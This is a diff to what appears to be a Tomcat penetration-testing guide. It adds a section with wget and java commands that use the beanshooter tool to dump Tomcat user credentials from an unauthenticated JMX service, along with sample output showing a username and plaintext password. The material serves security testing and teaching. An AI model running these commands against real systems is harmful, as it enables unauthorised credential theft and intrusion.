@@ -135,6 +135,31 @@ uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 
 ---
 
+---
+
+## Credential Extraction via JMX
+
+If JMX (Java Management Extensions) is exposed on the same Tomcat instance, you can enumerate Tomcat users without authentication.
+
+```bash
+# Download beanshooter
+wget https://github.com/qtc-de/beanshooter/releases/download/v4.1.0/beanshooter-4.1.0-jar-with-dependencies.jar
+
+# Enumerate - will dump Tomcat users if JMX is unauthenticated
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum TARGET 2222
+
+# Output:
+# [+] Enumerating tomcat users:
+# [+]     - Listing 2 tomcat users:
+# [+]             Username:  manager
+# [+]             Password:  fhErvo2r9wuTEYiYgt
+# [+]             Roles: manage-gui
+```
+
+See [Pentesting Java RMI/JMX](../recon-enumeration/pentesting-java-rmi-jmx.md) for more JMX exploitation techniques.
+
+---
+
 ## Ghostcat (CVE-2020-1938)
 
 **Affects:** Tomcat < 9.0.31, < 8.5.51, < 7.0.100
